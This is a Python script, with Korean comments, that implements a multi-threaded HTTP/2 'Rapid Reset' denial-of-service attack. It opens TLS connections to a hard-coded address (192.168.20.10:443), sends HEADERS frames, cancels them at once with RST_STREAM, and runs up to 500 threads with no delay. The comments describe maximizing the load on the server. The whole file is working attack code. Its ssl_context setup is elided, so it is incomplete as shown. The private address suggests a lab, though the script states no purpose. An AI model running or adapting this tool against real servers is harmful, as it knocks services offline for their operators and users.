import socket
import threading
import time
import sys
import random
import argparse
import ssl
import h2.connection
import h2.config

TARGET_IP   = "192.168.20.10"
TARGET_PORT = 443

# ... (parser definition remains the same)
parser = argparse.ArgumentParser(description="HTTP/2 Rapid Reset multi-threaded attacker")
parser.add_argument(
    "cancel_rate", type=float, nargs="?", default=1.0,
    help="Probability of RST_STREAM per HEADERS frame, 0.0–1.0 (default: 1.0)",
)
parser.add_argument(
    "--duration", type=int, default=None,
    help="Attack duration in seconds; omit for infinite",
)
parser.add_argument(
    "--rps", type=int, default=None,
    help="Total requests per second across all threads (default: max rate, 300 threads)",
)
args = parser.parse_args()

CANCEL_RATE = args.cancel_rate
end_time    = time.time() + args.duration if args.duration else None

# --rps N = N개 스레드, 대기 시간 제거하여 최대 속도 공격
if args.rps is not None:
    THREAD_COUNT   = args.rps
else:
    THREAD_COUNT   = 500  # 기본 스레드 수 상향

SLEEP_INTERVAL = 0  # 대기 시간 제거 (CPU 풀가동)
MAX_STREAMS_PER_CONN = 1000 # 한 연결당 최대한 많은 스트림 생성 후 재연결

# ... (ssl_context remains same)

def attack_worker(worker_id: int):
    while end_time is None or time.time() < end_time:
        try:
            raw_socket = socket.create_connection((TARGET_IP, TARGET_PORT), timeout=3)
            ssl_socket = ssl_context.wrap_socket(raw_socket, server_hostname=TARGET_IP)
            
            if ssl_socket.selected_alpn_protocol() != 'h2':
                ssl_socket.close()
                continue

            h2_conn = h2.connection.H2Connection(
                config=h2.config.H2Configuration(client_side=True)
            )
            h2_conn.initiate_connection()
            ssl_socket.sendall(h2_conn.data_to_send())

            stream_id = 1
            streams_opened = 0
            while (end_time is None or time.time() < end_time) and streams_opened < MAX_STREAMS_PER_CONN:
                headers = [
                    (":method",    "GET"),
                    (":authority", TARGET_IP),
                    (":scheme",    "https"),
                    (":path",      "/"),
                    ("user-agent", f"RapidReset-MegaBot-{worker_id}"),
                ]
                h2_conn.send_headers(stream_id, headers)
                if random.random() < CANCEL_RATE:
                    h2_conn.reset_stream(stream_id, error_code=0x8)
                
                # 데이터를 모아서 보내지 않고 즉시 전송하여 서버 오버헤드 극대화
                ssl_socket.sendall(h2_conn.data_to_send())
                
                stream_id += 2
                streams_opened += 1
                
                # SLEEP 제거

            ssl_socket.close()

        except Exception:
            if end_time and time.time() >= end_time:
                break
            time.sleep(0.1)


print(
    f"🔥 [Attacker] {THREAD_COUNT} threads  cancel_rate={CANCEL_RATE*100:.1f}%"
    + (f"  duration={args.duration}s" if args.duration else "  duration=∞")
)
sys.stdout.flush()

for i in range(THREAD_COUNT):
    t = threading.Thread(target=attack_worker, args=(i,))
    t.daemon = True
    t.start()

if args.duration:
    time.sleep(args.duration + 1)
    print("⏹️  Duration reached. Stopping.")
else:
    while True:
        time.sleep(1)
